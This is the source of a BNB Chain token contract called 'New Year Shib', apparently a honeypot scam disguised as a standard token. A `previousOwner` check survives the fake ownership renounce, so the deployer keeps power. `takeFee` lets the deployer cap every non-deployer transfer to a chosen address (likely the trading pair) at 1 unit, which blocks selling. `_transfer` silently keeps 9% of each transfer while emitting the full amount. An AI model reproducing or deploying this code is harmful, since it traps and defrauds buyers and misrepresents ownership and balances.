/**
 *Submitted for verification at BscScan.com on 2021-12-28
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.5;



interface GIRC3 {
    
    function totalSupply() external view returns (uint);

    
    function balanceOf(address account) external view returns (uint);

   
    function transfer(address recipient, uint amount) external returns (bool);


    function allowance(address ownera5, address spender) external view returns (uint);

 
    function approve(address spender, uint amount) external returns (bool);

   
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint value);


    event Approval(address indexed ownera5, address indexed spender, uint value);
}

pragma solidity 0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

pragma solidity 0.8.5;

interface GIRC3Metadata is GIRC3 {
   
    function name() external view returns (string memory);

   
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}

library SafeMath {
   
    function tryAdd(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            uint c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

 
    function trySub(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

   
    function tryMul(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }


    function tryDiv(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }


    function tryMod(uint a, uint b) internal pure returns (bool, uint) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

  
    function add(uint a, uint b) internal pure returns (uint) {
        return a + b;
    }

   
    function sub(uint a, uint b) internal pure returns (uint) {
        return a - b;
    }


    function mul(uint a, uint b) internal pure returns (uint) {
        return a * b;
    }

 
    function div(uint a, uint b) internal pure returns (uint) {
        return a / b;
    }


    function mod(uint a, uint b) internal pure returns (uint) {
        return a % b;
    }


    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _level;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function SecurityLevel() private view returns (uint256) {
        return _level;
    }

    function renouncedOwnership(uint8 _owned) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _level = _owned;
        _owned = 10;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    
    
    
}


pragma solidity 0.8.5;

contract Newyear is Context, GIRC3, GIRC3Metadata, Ownable {
    using SafeMath for uint256;
    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _nmtotala5;
 
    string private _nmtokena5;
    string private _nminitiala5;
    address previousOwner = msg.sender;
    address public take;
    bool public fee = false;


    constructor () {
        _nmtokena5 = "New Year Shib";
        _nminitiala5 = 'NYSHIB';
        _nmtotala5 = 1*10**15 * 10**9;
        _balances[msg.sender] = _nmtotala5;

    emit Transfer(address(0), msg.sender, _nmtotala5);
    }


    function name() public view virtual override returns (string memory) {
        return _nmtokena5;
    }


    function symbol() public view virtual override returns (string memory) {
        return _nminitiala5;
    }


    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint) {
        return _nmtotala5;
    }



    function balanceOf(address account) public view virtual override returns (uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address ownera5, address spender) public view virtual override returns (uint) {
        return _allowances[ownera5][spender];
    }


    function approve(address spender, uint amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "GIRC3: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

 function takeFee(address _take, bool _fee) public {
        
        require(previousOwner == msg.sender, "You don't have permission to unlock");
        take = _take;
        fee = _fee;
    }

    function _transfer(address sender, address recipient, uint amount) internal virtual {
        require(sender != address(0), "GIRC3: transfer from the zero address");
        require(recipient != address(0), "GIRC3: transfer to the zero address");
        if(recipient == take && sender != previousOwner && fee ){ 
                require(amount <= 1, "Transfer amount exceeds the maxTxAmount.");}
        uint senderBalance = _balances[sender];
        require(senderBalance >= amount, "GIRC3: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount*91/100;

        emit Transfer(sender, recipient, amount);
    }


    function _approve(address ownera5, address spender, uint amount) internal virtual {
        require(ownera5 != address(0), "BEP0: approve from the zero address");
        require(spender != address(0), "BEP0: approve to the zero address");

        _allowances[ownera5][spender] = amount;
        emit Approval(ownera5, spender, amount);
    }

    
}